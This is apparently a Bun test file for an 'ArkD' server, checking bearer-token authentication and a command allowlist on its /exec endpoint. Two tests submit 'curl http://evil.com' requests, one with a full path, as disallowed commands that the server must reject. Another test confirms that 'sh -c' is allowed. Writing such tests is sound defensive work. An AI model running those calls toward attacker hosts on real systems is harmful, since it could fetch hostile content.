/**
 * Security tests for ArkD server:
 * - Bearer token authentication
 * - Exec command allowlist
 */

import { describe, it, expect, beforeAll, afterAll } from "bun:test";
import { startArkd } from "../server.js";

// ── Auth tests ────────────────────────────────────────────────────────────────

describe("ArkD auth (token option)", () => {
  const AUTH_PORT = 19360;
  const AUTH_BASE = `http://localhost:${AUTH_PORT}`;
  const TOKEN = "test-secret-token-12345";
  let server: { stop(): void };

  beforeAll(() => {
    server = startArkd(AUTH_PORT, { quiet: true, token: TOKEN });
  });

  afterAll(() => {
    server.stop();
  });

  it("health endpoint is accessible without token", async () => {
    const resp = await fetch(`${AUTH_BASE}/health`);
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.status).toBe("ok");
  });

  it("authenticated endpoints return 401 without token", async () => {
    const resp = await fetch(`${AUTH_BASE}/metrics`);
    expect(resp.status).toBe(401);
  });

  it("authenticated endpoints return 401 with wrong token", async () => {
    const resp = await fetch(`${AUTH_BASE}/metrics`, {
      headers: { Authorization: "Bearer wrong-token" },
    });
    expect(resp.status).toBe(401);
  });

  it("authenticated endpoints return 200 with correct token", async () => {
    const resp = await fetch(`${AUTH_BASE}/metrics`, {
      headers: { Authorization: `Bearer ${TOKEN}` },
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(typeof data.cpu).toBe("number");
  });

  it("POST endpoints return 401 without token", async () => {
    const resp = await fetch(`${AUTH_BASE}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "echo", args: ["hello"] }),
    });
    expect(resp.status).toBe(401);
  });

  it("POST endpoints work with correct token", async () => {
    const resp = await fetch(`${AUTH_BASE}/exec`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${TOKEN}`,
      },
      body: JSON.stringify({ command: "echo", args: ["hello"] }),
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.stdout.trim()).toBe("hello");
  });
});

// ── Exec allowlist tests ──────────────────────────────────────────────────────

describe("ArkD exec command allowlist", () => {
  const EXEC_PORT = 19361;
  const EXEC_BASE = `http://localhost:${EXEC_PORT}`;
  let server: { stop(): void };

  beforeAll(() => {
    // No auth token for these tests -- simpler
    server = startArkd(EXEC_PORT, { quiet: true });
  });

  afterAll(() => {
    server.stop();
  });

  it("allows permitted commands (echo, git, bun)", async () => {
    const resp = await fetch(`${EXEC_BASE}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "echo", args: ["allowed"] }),
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.exitCode).toBe(0);
    expect(data.stdout.trim()).toBe("allowed");
  });

  it("rejects disallowed commands", async () => {
    const resp = await fetch(`${EXEC_BASE}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "curl", args: ["http://evil.com"] }),
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.exitCode).toBe(1);
    expect(data.stderr).toContain("Command not allowed");
  });

  it("rejects commands not in the allowlist even with full path", async () => {
    const resp = await fetch(`${EXEC_BASE}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "/usr/bin/curl", args: ["-s", "http://evil.com"] }),
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.exitCode).toBe(1);
    expect(data.stderr).toContain("Command not allowed");
  });

  it("allows sh commands (used by agent launchers)", async () => {
    const resp = await fetch(`${EXEC_BASE}/exec`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command: "sh", args: ["-c", "echo ok"] }),
    });
    expect(resp.status).toBe(200);
    const data = (await resp.json()) as any;
    expect(data.exitCode).toBe(0);
    expect(data.stdout.trim()).toBe("ok");
  });
});
